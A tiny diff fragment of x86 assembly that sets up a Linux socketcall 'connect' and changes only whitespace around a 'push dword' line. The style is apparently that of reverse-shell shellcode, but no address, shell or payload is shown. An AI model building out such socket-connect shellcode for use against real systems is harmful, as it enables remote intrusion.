@@ -20,8 +20,4 @@ main:
 	mov esi,eax
 	mov al,66		;socketcall unistd_32.h
 	inc ebx			;socketcall type=connect
-	push dword 
-	
-	
-	
-	
+	push dword
